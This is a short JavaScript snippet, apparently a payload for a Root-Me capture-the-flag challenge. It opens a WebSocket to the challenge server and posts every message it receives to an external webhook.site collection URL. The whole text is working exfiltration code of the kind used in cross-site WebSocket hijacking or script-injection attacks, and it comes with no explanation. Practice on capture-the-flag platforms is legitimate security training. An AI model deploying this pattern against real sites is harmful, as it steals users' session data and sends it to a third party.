var ws = new WebSocket('ws://ctf15.root-me.org/ws');
ws.onopen = function() {
    ws.send("hello");
};
ws.onmessage = function(event) {
    fetch('https://webhook.site/3b86524c-8ac8-4f64-a924-f0b3c0087145', {method: 'POST', mode: 'no-cors', body: event.data});
};